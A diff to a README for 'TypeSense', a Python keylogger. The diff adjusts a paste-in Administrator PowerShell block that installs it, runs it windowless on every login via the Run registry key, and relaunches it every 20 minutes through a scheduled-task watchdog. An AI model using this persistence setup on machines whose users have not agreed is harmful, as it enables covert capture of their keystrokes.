@@ -9,12 +9,17 @@ If you don't want to use the packaged `.exe` installer, you can run TypeSense di
 # TypeSense — run-from-Python setup (Windows)
 # Open Administrator PowerShell in the TypeSense folder, then paste this whole block.
 
-# Install Python 3.10+ if not present or too old
+# Abort unless we're in the project folder (otherwise autostart would point at a missing file)
+if (-not (Test-Path .\keylogger.py) -or -not (Test-Path .\requirements.txt)) {
+    throw "Run this from the TypeSense folder (keylogger.py / requirements.txt not found in $PWD)."
+}
+
+# Install Python 3.10-3.13 if not present or out of range (newer builds may lack dependency wheels)
 $needsPython = $true
 $pythonCmd = Get-Command python -ErrorAction SilentlyContinue
 if ($pythonCmd) {
     $ver = & python -c "import sys; print(f'{sys.version_info.major}.{sys.version_info.minor}')" 2>$null
-    if ($ver -and [version]$ver -ge [version]"3.10") { $needsPython = $false }
+    if ($ver -and [version]$ver -ge [version]"3.10" -and [version]$ver -lt [version]"3.14") { $needsPython = $false }
 }
 if ($needsPython) {
     Write-Host "Installing Python 3.11..."
@@ -33,6 +38,7 @@ Set-ExecutionPolicy Bypass -Scope Process -Force
 Write-Host "Installing dependencies..."
 python -m pip install --upgrade pip --quiet
 python -m pip install -r requirements.txt --quiet
+if ($LASTEXITCODE -ne 0) { throw "Dependency install failed - nothing was registered." }
 Write-Host "Dependencies ready."
 
 # Resolve paths
@@ -56,7 +62,8 @@ Write-Host "TypeSense is running. It will restart automatically on every login."
 ```
 
 **What this does:**
-- Installs Python 3.11 via `winget` if Python 3.10+ is not already on the machine
+- Refuses to run outside the TypeSense folder, and stops before registering anything if dependencies fail to install
+- Installs Python 3.11 via `winget` if Python 3.10-3.13 is not already on the machine
 - Installs all Python dependencies from `requirements.txt`
 - Registers `pythonw keylogger.py` in the user's `Run` registry key so the logger auto-starts on every login
 - Registers a scheduled task watchdog that relaunches the logger every 20 minutes if it was closed
